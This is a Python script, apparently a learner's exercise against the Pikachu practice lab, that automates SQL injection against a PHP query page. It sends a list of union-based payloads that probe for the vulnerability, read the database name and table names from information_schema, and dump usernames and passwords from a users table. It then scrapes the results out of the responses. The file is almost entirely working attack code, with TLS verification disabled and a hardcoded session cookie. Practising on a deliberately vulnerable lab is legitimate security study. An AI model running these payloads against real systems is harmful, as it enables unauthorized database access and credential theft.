import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()

url = "https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap-shanghai2.cloudstudio.club/vul/sqli/sqli_id.php"

cookie = {
    "PHPSESSID": "556pahfpk25mu8nqggdpav30s3"
}

payloads = [
    "1 and 1=1#",
    "1 and 1=2#",
    "1 order by 2#",
    "-1 union select 1,database()#",
    "-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu'#",
    "-1 union select 1,group_concat(username,0x3a,password) from users#"
]

# 导航菜单尾部标记，从这个字符串后面开始截取有效内容
cut_flag = "点一下提示"

for pay in payloads:
    print("=" * 80)
    print(f"Payload: {pay}")
    print("-" * 80)
    post_data = {
        "id": pay,
        "submit": "查询"
    }
    resp = requests.post(url, data=post_data, cookies=cookie, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    box = soup.find("div", class_="main-container ace-save-state")
    if box:
        full_text = box.get_text(strip=True)
        # 切掉侧边栏导航，只保留查询结果
        if cut_flag in full_text:
            result_text = full_text.split(cut_flag)[-1].strip()
        else:
            result_text = full_text
        print("【纯净查询结果】")
        print(result_text)
    else:
        print("❌ 没有找到容器标签")
        print("预览响应：")
        print(resp.text[:800])
